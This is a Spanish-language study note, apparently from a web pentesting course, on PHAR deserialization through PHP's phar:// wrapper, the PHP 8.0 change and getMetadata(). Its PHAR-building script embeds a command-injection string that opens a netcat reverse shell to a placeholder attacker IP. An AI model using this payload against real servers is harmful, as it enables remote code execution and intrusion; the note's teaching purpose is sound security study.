---
tags:
  - Web/Red-Team
  - Deserializacion
  - Pentesting/Explotacion
Descripción: "Cómo el wrapper phar:// convierte cualquier operación de ficheros en un sink de deserialización, y por qué sigue siendo relevante pese al cambio de PHP 8.0"
Fecha de actualización: 2026-11-20
Nota previa: "[[05 - Magic methods de PHP y la ruta a RCE]]"
Nota siguiente: "[[07 - PHPGGC y cadenas de gadgets]]"
Area: "[[Deserialización.base|Deserialización]]"
---
---

El `sink` más peligroso es el que no se escribe `unserialize`. <mark style="background: #FF5582A6;">En PHP, cualquier operación de ficheros sobre una ruta `phar://` deserializa los metadatos del archivo PHAR, sin que aparezca ninguna función de deserialización en el código</mark>. Esto convierte funciones aparentemente inofensivas —`file_exists`, `fopen`, `getimagesize`, `is_file`— en puntos de deserialización, y es la vía que explota un `sink` cuando la aplicación no llama a `unserialize` por ninguna parte.

# Qué es un PHAR y dónde está la deserialización

Un **PHAR** (`PHP Archive`) empaqueta una aplicación PHP entera en un solo fichero, como un JAR en Java. Se accede a su contenido con el `stream wrapper` `phar://`: `phar:///ruta/al/archivo.phar/fichero_interno.php`.

La propiedad que importa al atacante es que un PHAR tiene **metadatos**, y esos metadatos pueden ser cualquier valor PHP serializable. Según la documentación de PHP, al parsear la cabecera de un PHAR el motor **deserializa esos metadatos automáticamente**. Y «parsear la cabecera» ocurre con cualquier operación de ficheros que use el wrapper `phar://`.

<mark style="background: #8000E1A6;">La consecuencia es brutal: no hace falta un `unserialize` en el código. Basta con que el atacante controle, total o parcialmente, la ruta que llega a una función de ficheros, y pueda subir un archivo al servidor</mark>. Funciones afectadas:

| Categoría | Funciones |
| --- | --- |
| Existencia | `file_exists`, `is_file`, `is_dir`, `is_readable`, `file_get_contents` |
| Apertura | `fopen`, `readfile`, `file`, `fgets` |
| Metadatos | `stat`, `filesize`, `filemtime`, `getimagesize`, `exif_read_data` |
| Otros | `copy`, `unlink`, `hash_file`, `md5_file` |

# El escenario del módulo

`HTBank` tiene dos piezas que, juntas, componen el ataque:

1. Una **subida de ficheros** sin validación real de contenido (dice «solo JPG» pero no lo comprueba en el servidor). Permite subir un PHAR con extensión `.jpg`.
2. Un endpoint `/image?_=<ruta>` cuyo código pasa la ruta directamente a `file_exists`:

```php
public function getImage(Request $request) {
    if (file_exists($request->query('_')))
        return redirect($request->query('_'));
    else
        return redirect("/default.jpg");
}
```

Se controla la ruta entera que llega a `file_exists`. Juntando las dos piezas: se sube el PHAR como foto de perfil, se obtiene su ruta en `uploads/<md5>.jpg`, y se invoca `/image?_=phar://uploads/<md5>.jpg`. `file_exists` parsea el PHAR, PHP deserializa los metadatos, y el objeto que el atacante metió ahí cobra vida con sus `magic methods`.

# Fabricar el PHAR

El `payload` es un objeto en los metadatos. Generarlo requiere desactivar `phar.readonly` en el `php.ini` del atacante (no del objetivo):

```php
<?php
include('UserSettings.php');

$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->addFromString('0', '');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new \App\Helpers\UserSettings(
    '"; nc -nv <ATTACKER_IP> 9999 -e /bin/bash; #',
    'attacker@htbank.com', '$2y$10$...', 'default.jpg'
));
$phar->stopBuffering();
```

El objeto en `setMetadata` es el mismo que dispararía el `__wakeup` vulnerable de [[05 - Magic methods de PHP y la ruta a RCE]]. Subido y referenciado con `phar://`, el `file_exists` lo deserializa y ejecuta.

> [!warning]+ El PHAR se disfraza de cualquier cosa
> La extensión del fichero es irrelevante: un PHAR funciona con extensión `.jpg`, `.png`, `.pdf` o ninguna. Lo que un PHAR válido necesita es el `stub` con `__HALT_COMPILER();`, no una extensión concreta. Más aún, se puede construir un **polyglot** JPEG/PHAR que es a la vez una imagen válida (pasa validaciones de cabecera y de `getimagesize`) y un PHAR explotable. Ver [[06 - Uploads limitados - SVG, polyglots y metadatos]] para la técnica de polyglots en subidas.

# El cambio de PHP 8.0 y por qué esto no está muerto

Desde PHP 8.0 los metadatos de un PHAR **ya no se deserializan automáticamente** al parsear la cabecera; hace falta acceder explícitamente a ellos con `getMetadata()`. Esto cierra el vector en su forma clásica sobre PHP 8.

<mark style="background: #FFB86CA6;">Pero declarar el ataque obsoleto es un error</mark>, por tres razones:

1. **El `sink` sigue existiendo en 8.x si el código llama a `getMetadata()`.** Este es el punto importante y el que corrige a quien da el PHAR por muerto: el cambio de 8.0 quitó la deserialización *automática* al parsear la cabecera (verificado en `php-src`, `ext/phar/phar.c`: `phar_parse_metadata_lazy` solo copia bytes, sin deserializar), pero <mark style="background: #FF5582A6;">cualquier llamada a `Phar::getMetadata()` o `PharFileInfo::getMetadata()` **sin** el parámetro `$unserializeOptions` sigue deserializando y sigue siendo RCE, en cualquier versión de PHP</mark>. El vector no murió: se movió del parseo implícito a `getMetadata()`. Lo confirman CVEs de 2025-2026 como el de PhpSpreadsheet (`CVE-2026-34084` y su bypass de parche `CVE-2026-45034`).
2. **El parque de PHP 7 sigue siendo relevante.** En un `engagement`, fingerprint de la versión primero.
3. **Hay otros `stream wrappers` y técnicas de contaminación de ruta** que mantienen vivo el patrón «operación de ficheros con ruta controlada». El `phar://` es el caso estrella, no el único.

> [!danger]+ ERRATA de HTB: la cuota de PHP 7
> El módulo justifica la relevancia del PHAR citando que *«el 55,1 % de los sitios usan PHP 7»* (dato de 2022). <mark style="background: #FF5582A6;">A noviembre de 2026, según w3techs, PHP 7 está en el **24,5 %** y PHP 8 es ampliamente mayoritario (**68,1 %**)</mark>. El dato de HTB está invertido respecto a la realidad y sostiene un argumento falso. La relevancia del PHAR en 2026 no viene del parque de PHP 7 (que mengua), sino del punto 1: `getMetadata()` sin opciones sigue siendo RCE en PHP 8.

> [!important]+ Verificar la versión antes de descartar
> `file_get_contents('phar://...')` sobre un objetivo desconocido es una prueba barata: si dispara el comportamiento, es PHP 7 o código que llama a `getMetadata`. El fingerprint de versión de PHP (cabecera `X-Powered-By`, mensajes de error, comportamiento de funciones) decide si este capítulo aplica.

La investigación de referencia es el paper de Sam Thomas en Black Hat USA 2018, *«It's a PHP Unserialization Vulnerability Jim, but Not as We Know It»*, que introdujo la técnica. `PHPGGC` puede generar directamente el PHAR con una cadena de `gadgets` en los metadatos (`-p phar`), lo que combina este vector con el de la nota siguiente.

> [!info]+ Fuentes
> Comportamiento de los metadatos PHAR y su deserialización: [manual de PHP — PHAR](https://www.php.net/manual/en/intro.phar.php) y [`Phar::getMetadata`](https://www.php.net/manual/en/phar.getmetadata.php). Cambio de PHP 8.0: código de [`php-src ext/phar/phar.c`](https://github.com/php/php-src/blob/master/ext/phar/phar.c). Técnica original: [Sam Thomas, Black Hat USA 2018](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf). Caso del módulo 169 de HTB Academy.
